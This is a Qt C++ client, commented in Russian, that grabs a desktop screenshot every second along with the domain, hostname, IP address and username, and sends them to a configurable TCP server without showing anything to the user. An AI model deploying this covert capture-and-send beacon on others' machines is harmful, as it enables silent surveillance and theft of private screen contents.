#include <QApplication>
#include <QTcpSocket>
#include <QDateTime>
#include <QHostInfo>
#include <QNetworkInterface>
#include <QSysInfo>
#include <QTimer>

#include <QPixmap>
#include <QDesktopWidget>
#include <QBuffer>


// Функция для создания клиента и установки соединения с сервером
void connectToServer()
{
    QTcpSocket *socket = new QTcpSocket();
    socket->connectToHost("localhost", 1234); // Укажите IP-адрес и порт сервера

    if (!socket->waitForConnected(5000))
    {
        socket->deleteLater();
        return;
    }

    // Получение текущего времени
    QDateTime currentTime = QDateTime::currentDateTime();
    QString timeString = currentTime.toString("yyyy-MM-dd hh:mm:ss");

    // Получение информации о домене, компьютере, IP-адресе и пользователе (как в предыдущем примере)
    QString domain = QHostInfo::localDomainName();
    QString computerName = QSysInfo::machineHostName();
    QString ipAddress;
    QList<QHostAddress> ipAddresses = QNetworkInterface::allAddresses();
    for (const QHostAddress &address : ipAddresses)
    {
        if (address.protocol() == QAbstractSocket::IPv4Protocol && address != QHostAddress::LocalHost)
        {
            ipAddress = address.toString();
            break;
        }
    }
    QString userName = qgetenv("USERNAME"); // Для Windows


    QPixmap px = QPixmap::grabWindow(QApplication::desktop()->winId());
    QPixmap screenshot = px.scaled(px.width() / 5, px.height() / 5);
    QByteArray screenshotData;
    QBuffer buffer(&screenshotData);
    buffer.open(QIODevice::WriteOnly);
    screenshot.save(&buffer, "PNG");

    // Создание строки данных, включающей время, домен, компьютер, IP-адрес и пользователя
    QString data = domain + computerName + ipAddress + userName +
            "," + domain + "," + computerName + "," + ipAddress + "," + userName + "," + timeString + ",";

    // Отправка данных на сервер
    socket->write(data.toUtf8());
    socket->write(screenshotData);
    socket->waitForBytesWritten(5000);

    // Получение ответа от сервера
    socket->waitForReadyRead(5000);
    QByteArray response = socket->readAll();

    socket->disconnectFromHost();
    socket->deleteLater();
}

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);

    // Установка таймера для повторного подключения к серверу
    QTimer timer;
    QObject::connect(&timer, &QTimer::timeout, &connectToServer);
    timer.start(1000); // Интервал повторного подключения (в миллисекундах)

    // Подключение к серверу при запуске клиента
    connectToServer();

    return a.exec();
}
